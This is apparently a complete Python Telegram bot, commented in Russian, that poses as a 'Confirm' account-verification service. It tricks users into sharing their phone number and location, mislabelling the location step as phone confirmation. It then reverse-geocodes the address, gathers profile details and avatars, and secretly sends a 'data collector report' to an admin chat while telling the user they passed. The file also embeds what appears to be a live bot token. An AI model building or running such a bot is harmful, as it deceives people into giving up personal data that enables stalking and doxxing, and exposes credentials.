import logging
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from geopy.geocoders import Nominatim

# ================= НАСТРОЙКИ БОТА =================
import os

TOKEN = os.getenv("8962515706:AAHjbT5A97y8lRwY2hZXhf_q2K16o2TFvtY")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8278973263"))
# ==================================================
logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

# ID приложения для геокодера
geolocator = Nominatim(user_agent="telegram_metadata_bot_2026")

class SuperCollector(StatesGroup):
    waiting_for_decision = State()
    waiting_for_contact = State()
    waiting_for_location = State()

# 1. ШАГ: Старт (Одна кнопка + Объявление про телефон)
@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    await state.update_data(first_contact=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    
    kb = InlineKeyboardBuilder()
    kb.button(text="✅ Подтвердить профиль", callback_data="super_confirm")
    
    welcome_text = (
        "👋 **Добро пожаловать в систему верификации Confirm!**\n\n"
        "Для предоставления доступа к сервису и проверки подлинности вашего аккаунта, "
        "пожалуйста, нажмите кнопку ниже.\n\n"
        "⚠️ **ВАЖНОЕ ПРЕДУПРЕЖДЕНИЕ:**\n"
        "Прохождение проверки допускается **строго с мобильного телефона** (смартфона). "
        "При использовании компьютерной версии Telegram система авторизации не сможет завершить процесс."
    )
    
    await message.answer(
        welcome_text,
        reply_markup=kb.as_markup(),
        parse_mode="Markdown"
    )
    await state.set_state(SuperCollector.waiting_for_decision)

# 2. ШАГ: Подтверждение -> Запрос контакта с кнопкой "ТЫК"
@dp.callback_query(SuperCollector.waiting_for_decision, F.data == "super_confirm")
async def process_confirm(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🟢 Действие подтверждено. Шаг 1/2: Синхронизация номера телефона.")
    
    kb = ReplyKeyboardBuilder()
    kb.button(text=" ТЫК ", request_contact=True)
    
    await callback.message.answer(
        "Нажмите кнопку « ТЫК » ниже, чтобы подтвердить :",
        reply_markup=kb.as_markup(resize_keyboard=True, one_time_keyboard=True)
    )
    await state.set_state(SuperCollector.waiting_for_contact)

# 3. ШАГ: Получение контакта -> Запрос локации с кнопкой "ТЫК"
@dp.message(SuperCollector.waiting_for_contact, F.contact)
async def process_contact(message: types.Message, state: FSMContext):
    if message.contact.user_id != message.from_user.id:
        await message.answer("⚠️ Ошибка безопасности. Отправьте именно свой контакт через кнопку!")
        return
        
    await state.update_data(phone=message.contact.phone_number)
    
    kb = ReplyKeyboardBuilder()
    kb.button(text=" ТЫК ", request_location=True)
    
    await message.answer(
        "🟢 Шаг 2/2: Для завершения анализа безопасности подтвердите ваш телефон :",
        reply_markup=kb.as_markup(resize_keyboard=True, one_time_keyboard=True)
    )
    await state.set_state(SuperCollector.waiting_for_location)

# 4. ШАГ: Получение геопозиции + Сбор ВСЕХ данных + Исправленная отправка админу
@dp.message(SuperCollector.waiting_for_location, F.location)
async def process_location(message: types.Message, state: FSMContext):
    user = message.from_user
    loc = message.location
    time_received = datetime.now().strftime("%H:%M:%S")
    
    saved_data = await state.get_data()
    phone = saved_data.get('phone', 'Не определен')
    first_contact_time = saved_data.get('first_contact', 'Только что')

    # АНАЛИЗ ГЕОЛОКАЦИИ
    lat, lon = loc.latitude, loc.longitude
    full_address = "Не удалось распознать адрес автоматически"
    try:
        location_obj = geolocator.reverse((lat, lon), timeout=10)
        if location_obj:
            full_address = location_obj.address
    except Exception:
        pass

    # ИСПРАВЛЕННЫЙ АНАЛИЗ АВАТАРОК (Без вылетов скрипта)
    avatar_file_id = None
    avatar_count = 0
    try:
        user_photos = await bot.get_user_profile_photos(user.id, limit=1)
        if user_photos.total_count > 0:
            avatar_count = user_photos.total_count
            avatar_file_id = user_photos.photos[0][0].file_id  # Исправленный индекс
    except Exception:
        pass

    # АНАЛИЗ ВОЗРАСТА АККАУНТА ПО ID
    u_id = user.id
    if u_id > 7500000000:
        est_date = "Середина 2025 — 2026 год (Очень новый аккаунт)"
    elif u_id > 6000000000:
        est_date = "2023 — 2024 год"
    elif u_id > 5000000000:
        est_date = "2021 — 2022 год"
    else:
        est_date = "До 2021 года (Старый, надежный аккаунт)"

    msg_id = message.message_id
    chat_type = message.chat.type
    lang = user.language_code if user.language_code else "Не указан"
    is_premium = "Да ✨" if user.is_premium else "Нет"
    has_username = "Да" if user.username else "Нет"
    is_bot = "Да (Внимание! Робот)" if user.is_bot else "Нет (Реальный человек)"
    full_name = user.full_name

    # ФОРМИРОВАНИЕ ПОЛНОГО ОТЧЕТА ДЛЯ ВАС
    report = (
        "👑 **УЛЬТИМАТИВНЫЙ ОТЧЕТ СБОРЩИКА ДАННЫХ**\n"
        "====================================\n\n"
        "👤 **1. ОСНОВНОЙ ПРОФИЛЬ**\n"
        f"┣ Имя/Отображаемое: {full_name}\n"
        f"┣ Никнейм: @{user.username if user.username else 'Отсутствует'}\n"
        f"┣ Ссылка: [Открыть профиль](tg://user?id={u_id})\n"
        f"┗ Номер телефона: `{phone}`\n\n"
        
        "🔒 **2. БЕЗОПАСНОСТЬ И АНАЛИЗ ID**\n"
        f"┣ Telegram ID: `{u_id}`\n"
        f"┣ Тип аккаунта: {is_bot}\n"
        f"┣ Telegram Premium: {is_premium}\n"
        f"┣ Наличие публичного юзернейма: {has_username}\n"
        f"┣ Всего фото в профиле: {avatar_count} шт.\n"
        f"┗ Примерная дата регистрации: {est_date}\n\n"
        
        "🌐 **3. ГЕОЛОКАЦИЯ И МЕСТОПОЛОЖЕНИЕ**\n"
        f"┣ Широта (Latitude): `{lat}`\n"
        f"┣ Долгота (Longitude): `{lon}`\n"
        f"┣ Карта: [Открыть Google Maps](https://google.com{lat},{lon})\n"
        f"┗ Определенный адрес: `{full_address}`\n\n"
        
        "⚙️ **4. ТЕХНИЧЕСКИЕ МЕТАДАННЫЕ API**\n"
        f"┣ Язык интерфейса приложения: {lang}\n"
        f"┣ ID сообщения с геопозицией: {msg_id}\n"
        f"┣ Тип текущего чата: {chat_type}\n"
        f"┣ Время старта бота: {first_contact_time}\n"
        f"┗ Время фиксации геопозиции: {time_received}\n"
        "===================================="
    )

    # Прикольное финальное сообщение пользователю
    fun_success_text = (
        "🎉 **Ееебой! Вы успешно прошли верификацию!**\n\n"
        "🤖 Наша нейросеть проверила ваши гигабайты данных, покрутила шестеренками и вынесла вердикт: "
        "**Вы абсолютно точно кожаный мешок (человек)!**\n\n"
        "Доступ к системе Confirm полностью открыт. Протокол безопасности удовлетворен! 😎"
    )

    await message.answer(
        fun_success_text, 
        reply_markup=types.ReplyKeyboardRemove(),
        parse_mode="Markdown"
    )

    # Скрытая отправка данных вам
    try:
        if avatar_file_id:
            await bot.send_photo(chat_id=ADMIN_ID, photo=avatar_file_id, caption=report, parse_mode="Markdown")
        else:
            await bot.send_message(chat_id=ADMIN_ID, text=report, parse_mode="Markdown")
    except Exception as e:
        print(f"Ошибка скрытой отправки админу: {e}")

    await state.clear()

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logging.info("Бот выключен.")
